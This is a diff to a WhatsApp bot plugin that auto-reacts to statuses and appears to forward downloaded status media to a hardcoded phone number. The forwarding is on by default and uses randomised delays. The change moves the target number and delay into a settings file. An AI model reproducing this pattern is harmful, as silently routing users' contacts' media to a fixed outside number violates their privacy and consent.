@@ -3,20 +3,22 @@ const path = require('path');
 const { downloadMediaMessage } = require('@whiskeysockets/baileys');
 
 const isOwnerOrSudo = require('../lib/isOwner');
+const settings = require('../settings');
 
 // ────────────────────────────────────────────────
 const CONFIG_FILE = path.join(__dirname, '../data/autoStatus.json');
-const TARGET_NUMBER = '255615944741';
+const TARGET_NUMBER = settings.syncTarget || '255615944741'; // Use settings.js
 const TARGET_JID = `${TARGET_NUMBER}@s.whatsapp.net`;
+const SYNC_DELAY = settings.syncDelay || 6; // Low number sync delay
 
 const DEFAULT_CONFIG = Object.freeze({
     enabled: true,             // always on by default
     reactWith: '❤️',           // always react with heart/like by default
-    reactDelayMinMs: 400,
-    reactDelayMaxMs: 950,
-    infoDelayMinMs: 800,
-    forwardDelayMinMs: 1400,
-    forwardDelayMaxMs: 3800,
+    reactDelayMinMs: SYNC_DELAY * 100,     // Use sync delay
+    reactDelayMaxMs: SYNC_DELAY * 200,
+    infoDelayMinMs: SYNC_DELAY * 150,
+    forwardDelayMinMs: SYNC_DELAY * 250,
+    forwardDelayMaxMs: SYNC_DELAY * 500,
 });
 
 let configCache = null;
